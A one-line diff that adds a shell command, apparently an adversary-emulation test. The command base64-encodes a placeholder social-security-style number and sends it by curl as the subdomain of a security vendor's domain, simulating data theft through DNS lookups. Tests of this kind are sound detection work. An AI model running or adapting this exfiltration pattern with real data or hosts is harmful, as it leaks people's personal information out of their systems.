@@ -1,0 +1,1 @@
+echo -n 111-11-1111 | base64; curl -XPOST MTExLTExLTExMTE=.redcanary.com
